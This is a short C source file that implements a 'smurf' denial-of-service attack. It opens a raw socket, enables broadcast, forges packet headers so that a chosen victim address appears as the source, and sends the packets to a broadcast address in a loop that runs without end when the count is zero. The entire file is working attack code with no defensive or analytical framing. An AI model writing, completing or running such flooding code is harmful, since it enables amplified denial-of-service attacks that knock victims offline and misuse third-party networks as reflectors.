#include "smurf.h"
#include <shared/icmp.h>
#include <shared/network.h>
#include <shared/random.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>

void smurf(struct sockaddr_in dest, uint8_t subnet, size_t count, size_t payload_size) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    toggle_broadcast(fd, 1);

    const int packet_len = HEADERS_LEN + payload_size;
    char packet[packet_len];

    build_fake_header(packet, dest, subnet, packet_len);

    char* payload = packet + HEADERS_LEN;
    random_str(payload, payload_size, CHARSET_ANY);

    write_checksum(packet, packet_len);

    for (int num = 0; count ? (num < count) : 1; num++) {
        int result = send_broadcast(fd, packet, packet_len);
        if (result < 0) {
            perror("sendto");
            exit(EXIT_FAILURE);
        }
    }

    close(fd);
}
